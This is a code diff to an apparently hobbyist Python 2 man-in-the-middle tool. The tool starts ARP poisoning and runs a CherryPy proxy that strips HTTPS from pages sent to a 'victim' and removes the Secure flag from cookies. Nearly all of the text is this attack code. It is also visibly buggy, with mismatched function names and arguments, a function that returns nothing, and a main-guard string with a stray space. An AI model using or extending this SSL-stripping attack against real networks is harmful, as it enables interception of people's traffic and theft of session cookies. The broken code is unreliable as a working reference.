@@ -2,6 +2,7 @@ import os
 from scapy.all import *
 import time
 import requests
+import cherrypy
 
 print "                                                               "
 print "              _           _        _             _             "
@@ -34,7 +35,7 @@ os.system("gnome-terminal -e 'python arpPoison.py' & disown")
 
 #Starting the stripping process
 
-def StrippingHTTPS(url, requestA):
+def StripHTTPS(url, request):
 
     # Response message for the victim
     responseVictim = requests.models.Response()
@@ -47,20 +48,46 @@ def StrippingHTTPS(url, requestA):
 
 
     # Replace HTTPS with HTTPS 
-    newURL = str(requestA.text).replace("HTTPS", "HTTP")
+    newURL = str(request.text).replace("HTTPS", "HTTP")
     newURL = str(newURL).replace("https", "http")
 
     responseVictim._content = newURL.encode('utf-8')
 
-    responseVictim.headers = requestA.headers
-    responseVictim.history = requestA.history
-    responseVictim.encoding = requestA.encoding
-    responseVictim.reason = requestA.reason
-    responseVictim.elapsed = requestA.elapsed
-    responseVictim.request = requestA.request
-
-    print "HTTPS was stripped"
+    responseVictim.headers = request.headers
+    responseVictim.history = request.history    
+    responseVictim.encoding = request.encoding
+    responseVictim.reason = request.reason
+    responseVictim.elapsed = request.elapsed
+    responseVictim.request = request.request
 
     return responseVictim
 
+def stripSecureCookie(response):
+   cookie = response.cookies
+   newCookie = str(cookie).replace("Secure;", "")
+   response.cookies = newCookie
+
+class sslStripping(object):
+    @cherrypy.expose
+    def main(self):
+        url = cherrypy.url()
+            
+        url = str(url).replace("http", "https")
+        
+        response = requests.get(url)
+
+        response = stripHTTPS(response, url)
+
+        response = stripSecureCookie(response)
+
+        return response.content
+
+if __name__ == ' __main__':
+    cherrypy.config.update({'server.socket_host': '0.0.0.0' })
+
+    cherrypy.quickstart(sslStripping)
+
+
+
+        
 
